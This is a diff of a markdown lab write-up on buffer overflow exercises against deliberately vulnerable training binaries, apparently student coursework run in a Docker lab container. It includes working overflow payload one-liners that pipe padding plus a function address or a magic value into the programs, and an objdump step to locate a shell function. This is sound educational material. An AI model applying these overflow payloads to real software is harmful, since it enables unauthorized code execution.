@@ -3,6 +3,7 @@
 ## File bof1.c
 
 **Run vitual environment by docker**
+
 >docker run -it --privileged -v D:\StudyHK1_2024\InformationSecurity\SecLabs:/home/seed/seclabs img4lab
 
 **Getting secretFunc() address by command**
@@ -11,14 +12,16 @@
 ![alt text](./image/image.png)
 
 **Stack frame**
-![alt text](./image/image-1.png)
 
+![alt text](./image/image-1.png)
 
 => It’s a buffer overflow at the 205th byte.
 
 **Run the program by the command**
+
 - Take advantage of the above statement to automatically input 204 bytes of the letter 'a', then insert the address of the `secretFunc` function.
-- replacement byte (204byte) + address secretFunc(\x6b\x84\x04\x08)
+- placement byte (204byte) + address secretFunc(\x6b\x84\x04\x08)
+
  > echo $(python -c "print('a'*204 + '\x6b\x84\x04\x08')") | ./bof1.out
 
 ![alt text](./image/image-2.png)
@@ -45,6 +48,7 @@
 ![alt text](./image/image-5.png)
 
 >echo $(python -c "print('a'*40 + '\xef\xbe\xad\xde')") | ./bof2.out
+
 ![alt text](./image/image-6.png)
 
 => Successfully
@@ -61,8 +65,10 @@
 **Stack frame**
 
 ![alt text](./image/image-7.png)
-**Get the shell function's address**
+
+**Get the address of the shell function:**
 `objdump -d bof3.out|grep shell`
+
 ![alt text](./image/image-8.png)
 
 **Run the program with the command**
